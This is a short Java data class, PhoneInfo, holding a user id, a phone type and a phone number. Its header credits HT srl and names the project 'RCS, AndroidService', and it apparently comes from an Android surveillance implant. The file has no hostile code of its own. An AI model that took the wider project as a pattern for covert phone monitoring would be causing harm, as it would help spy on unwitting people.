/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : PhoneInfo.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.module.task;

public class PhoneInfo {
	private static final String TAG = "PhoneInfo"; //$NON-NLS-1$

	private final long userId;
	private final int phoneType;
	private final String phoneNumber;

	public PhoneInfo(long userId, int phoneType, String phoneNumber) {
		this.userId = userId;
		this.phoneType = phoneType;
		this.phoneNumber = phoneNumber;
	}

	public long getUserId() {
		return userId;
	}

	public int getPhoneType() {
		return phoneType;
	}

	public String getPhoneNumber() {
		return phoneNumber;
	}
}
